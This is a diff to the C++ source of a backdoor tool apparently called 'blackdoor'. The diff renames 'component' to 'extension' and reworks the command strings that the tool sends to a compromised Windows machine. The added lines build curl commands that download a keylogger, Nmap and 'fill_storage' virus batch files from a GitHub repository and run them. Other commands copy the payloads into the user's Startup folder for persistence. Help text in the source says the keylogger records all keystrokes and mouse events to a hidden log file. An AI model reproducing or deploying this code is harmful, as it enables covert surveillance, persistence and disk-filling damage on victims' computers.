@@ -243,7 +243,7 @@ string CE_InfoExt(string buffer)
         ebuf = "echo [EXT] [INFO] - This extension is built in C++ language and it logs all mouse and keyboard events and makes them available in C:\\ProgramData\\Ms\\log.txt file. And the keylogger.exe file is in C:\\ProgramData\\Ms \nAll events will be added to the file cumulatively, you can delete it if you want to re-registration, or you can use the following command: $ ext reset keylog \n";
         ebuf += "[ $ ] - Available Commands : \n";
         ebuf += "[ $ ext run keylog ] ->  for start recording \n";
-        ebuf += "[ $ ext info keylog ] -> show some info for keylog component\n";
+        ebuf += "[ $ ext info keylog ] -> show some info for keylog extension\n";
         ebuf += "[ $ ext reset keylog ] -> delete keylog file :  C:\\ProgramData\\Ms\\log.txt \n";
     }
     else if (ebuf.find("fill_storage") != string::npos)
@@ -252,7 +252,7 @@ string CE_InfoExt(string buffer)
         ebuf += "[ $ ] - Available Commands : \n";
         ebuf += "[ $ ext run fill_storage ] ->  for start fill storage \n";
         ebuf += "[ $ ext startup fill_storage ] -> copying the file fill_storage_move.bat to C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n";
-        ebuf += "[ $ ext info fill_storage ] -> show some info for fill_storage component\n";
+        ebuf += "[ $ ext info fill_storage ] -> show some info for fill_storage extension\n";
     }
     else
     {
@@ -270,27 +270,27 @@ string CE_RunExt(string buffer)
 
     if (ebuf.find("keylog") != string::npos)
     {
-        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/keylogger.exe -o C:\\ProgramData\\Ms\\keylogger.exe && IF EXIST C:\\ProgramData\\Ms\\keylogger.exe ( start C:\\ProgramData\\Ms\\keylogger.exe ) ELSE ( echo; ) && echo. && echo [EXT] [DOWNLOAD] - keylogger.exe component && echo. && echo [EXT] [RUN] - keylog component ..";
+        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/keylogger.exe -o C:\\ProgramData\\Ms\\keylogger.exe && IF EXIST C:\\ProgramData\\Ms\\keylogger.exe ( start C:\\ProgramData\\Ms\\keylogger.exe ) ELSE ( echo; ) && echo. && echo [EXT] [DOWNLOAD] - keylogextension in C:\\ProgramData\\Ms\\keylogger.exe && echo. && echo [EXT] [RUN] - keylog extension ..";
         ebuf = command;
     }
     if (ebuf.find("nmap") != string::npos)
     {
-        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/Nmap.zip -o C:\\ProgramData\\Ms\\Nmap.zip && IF EXIST C:\\ProgramData\\Ms\\keylogger.exe ( start C:\\ProgramData\\Ms\\keylogger.exe ) ELSE ( echo; ) && echo. && echo [EXT] [DOWNLOAD] - keylogger.exe component && echo. && echo [EXT] [RUN] - keylog component ..";
+        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/Nmap.zip -o C:\\ProgramData\\Ms\\Nmap.zip && IF EXIST C:\\ProgramData\\Ms\\Nmap.zip ( powershell -Command \"Expand-Archive -Path \"C:\\ProgramData\\Ms\\Nmap.zip\" -DestinationPath \"C:\\ProgramData\\Ms\"\" ) ELSE ( echo; ) && echo. && echo. && C:\\ProgramData\\Ms\\Nmap\\nmap && echo. && echo. && echo [EXT] [DOWNLOAD] - Nmap extension in C:\\ProgramData\\Ms\\Nmap && echo. && echo [EXT] [RUN] - cd C:\\ProgramData\\Ms\\Nmap && nmap";
         ebuf = command;
     }
     else if (ebuf.find("fill_storage") != string::npos)
     {
-        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_move.bat -o C:\\ProgramData\\Ms\\fill_storage_move.bat && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_virus.bat -o C:\\ProgramData\\Ms\\fill_storage_virus.bat && IF EXIST C:\\ProgramData\\Ms\\fill_storage_move.bat ( start C:\\ProgramData\\Ms\\fill_storage_move.bat ) ELSE ( echo; ) && echo. && echo [EXT] [DOWNLOAD] - fill_storage [ move.bat, virus.bat ] component && echo. && echo [EXT] [RUN] - fill_storage component ..";
+        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_move.bat -o C:\\ProgramData\\Ms\\fill_storage_move.bat && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_virus.bat -o C:\\ProgramData\\Ms\\fill_storage_virus.bat && IF EXIST C:\\ProgramData\\Ms\\fill_storage_move.bat ( start C:\\ProgramData\\Ms\\fill_storage_move.bat ) ELSE ( echo; ) && echo. && echo [EXT] [DOWNLOAD] - fill_storage [ move.bat, virus.bat ] extension in C:\\ProgramData\\Ms && echo. && echo [EXT] [RUN] - fill_storage extension ..";
         ebuf = command;
     }
     else
     {
-        ebuf = "echo [EXT] [ERR] - You must use a valid component name !";
+        ebuf = "echo [EXT] [ERR] - You must use a valid extension name !";
     }
 
     return ebuf;
 }
-
+//powershell -Command Expand-Archive -Path 'Nmap.zip' -DestinationPath '.'
 
 string CE_StartupExt(string buffer)
 {
@@ -304,12 +304,12 @@ string CE_StartupExt(string buffer)
         if (ebuf.find("run") != string::npos) {
             command += " && IF EXIST \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\keylogger.exe\" ( start \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\keylogger.exe\" ) ELSE ( echo; ) ";
         }
-        command += " && echo. && echo [EXT] [DOWNLOAD] - keylogger.exe component && echo. && echo [EXT] [RUN] - keylog component .. ";
+        command += " && echo. && echo [EXT] [DOWNLOAD] - keylog extension in C:\\ProgramData\\Ms\\keylogger.exe && echo. && echo [EXT] [RUN] - keylog extension .. ";
         ebuf = command;
     }
     else if (ebuf.find("fill_storage") != string::npos)
     {
-        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_move.bat -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_move.bat\" && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_virus.bat -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_virus.bat\" && IF EXIST \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_move.bat\" ( start \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_move.bat\" ) ELSE ( echo; ) && echo. && echo [CMP] [DOWNLOAD] - fill_storage [ move.bat, virus.bat ] component  && echo [CMP] [RUN] - fill_storage component ..";
+        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_move.bat -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_move.bat\" && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_virus.bat -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_virus.bat\" && IF EXIST \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_move.bat\" ( start \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_move.bat\" ) ELSE ( echo; ) && echo. && echo [CMP] [DOWNLOAD] - fill_storage [ move.bat, virus.bat ] extension in C:\\ProgramData\\Ms\\ && echo [CMP] [RUN] - fill_storage extension ..";
                 if (ebuf.find("run") != string::npos) {
             command += " && IF EXIST \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_move.bat\" ( start \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_move.bat\" ) ELSE ( echo; ) ";
         }
@@ -317,12 +317,11 @@ string CE_StartupExt(string buffer)
     }
     else
     {
-        ebuf = "echo [EXT] [ERR] - You must use a valid component name !";
+        ebuf = "echo [EXT] [ERR] - You must use a valid extension name !";
     }
 
     return ebuf;
 }
-// powershell -Command Expand-Archive -Path 'Nmap.zip' -DestinationPath '.'
 
 string CE_StopExt(string buffer)
 {
